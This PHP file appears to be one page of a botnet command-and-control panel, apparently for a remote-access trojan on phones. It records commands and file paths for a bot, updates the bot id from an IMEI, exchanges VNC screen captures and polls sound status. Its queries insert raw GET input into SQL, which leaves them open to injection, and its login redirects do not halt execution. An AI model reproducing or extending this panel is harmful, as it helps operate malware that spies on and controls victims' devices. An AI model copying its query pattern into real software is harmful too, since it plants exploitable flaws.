<?php
session_start();
$statusCode=false;
if(!(isset($_SESSION['panel_user'])))
{
	session_destroy();
	header("Location: /login.php");
}else{
	if($_SESSION['panel_status']!="Action"){
		session_destroy();
		header("Location: /login.php");
	}else{
		$statusCode=true;
	}

}
if($statusCode){
	if((isset($_GET['server'])&&($_GET['server'])=="goserverstop")){
		include '../../config.php';
		$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection->exec('SET NAMES utf8');     
		$statement = $connection->prepare("UPDATE ws SET statusserver='0' WHERE id='1'");
		$statement->execute();
	}
	if(isset($_GET['pathFileFolder'])){
		$command = $_GET['pathFileFolder'];
		include '../../config.php';
		$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection->exec('SET NAMES utf8');     
		$statement = $connection->prepare("UPDATE ws SET command='$command' WHERE id='1'");
		$statement->execute([$command]);
	}
	if(isset($_GET['statusfilefolder'])){
		$statusfilefolder = $_GET['statusfilefolder'];
		if($statusfilefolder=="get"){
			include '../../config.php';
			$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
			$connection->exec('SET NAMES utf8');     
			$statement = $connection->prepare("SELECT statusfilefolder FROM ws WHERE id='1'");
			$statement->execute([$statusfilefolder]);

			foreach($statement as $row){
				echo  $row['statusfilefolder'];
			}
		}
	}
	if(isset($_GET['deletevncimage'])){
		$deletevncimage = $_GET['deletevncimage'];
		if($deletevncimage=="deletejpgvnc"){
			@unlink("VNC.jpg");
		}
	}
	if(isset($_GET['statvnc'])){
		$vncscreen = $_GET['statvnc'];
		if($vncscreen=="get"){
			include '../../config.php';
			$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
			$connection->exec('SET NAMES utf8');     
			$statement = $connection->prepare("SELECT vncscreen FROM ws WHERE id='1'");
			$statement->execute();
			foreach($statement as $row){
				echo  $row['vncscreen'];
			}
		}
	}
	if(isset($_GET['vncupdateimage'])){
		$vncscreen = $_GET['vncupdateimage'];
		include '../../config.php';
		$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection->exec('SET NAMES utf8');     
		$statement = $connection->prepare("UPDATE ws SET vncscreen='$vncscreen' WHERE id='1'");
		$statement->execute([$vncscreen]);
	}
	if(isset($_GET['sound'])){
		$getsound = $_GET['sound'];
		if($getsound=="get"){
			include '../../config.php';
			$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
			$connection->exec('SET NAMES utf8');     
			$statement = $connection->prepare("SELECT sound FROM ws WHERE id='1'");
			$statement->execute();
			foreach($statement as $row){
				echo  $row['sound'];
			}
		}
	}
	if(isset($_GET['updateimei'])){
		$botid = $_GET['updateimei'];
		include '../../config.php';
		$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection->exec('SET NAMES utf8');     
		$statement = $connection->prepare("UPDATE ws SET botid='$botid', lastconnect='' WHERE id='1'");
		$statement->execute([$botid]);
	}
	
	
	
}
?>